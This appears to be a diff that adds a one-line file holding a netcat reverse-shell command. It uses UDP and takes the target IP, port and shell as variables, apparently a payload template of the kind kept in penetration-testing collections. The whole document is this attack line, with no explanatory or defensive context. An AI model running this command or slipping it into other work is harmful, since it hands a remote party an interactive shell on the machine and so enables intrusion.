@@ -1,0 +1,1 @@
+nc --udp $ip $port -e $shell
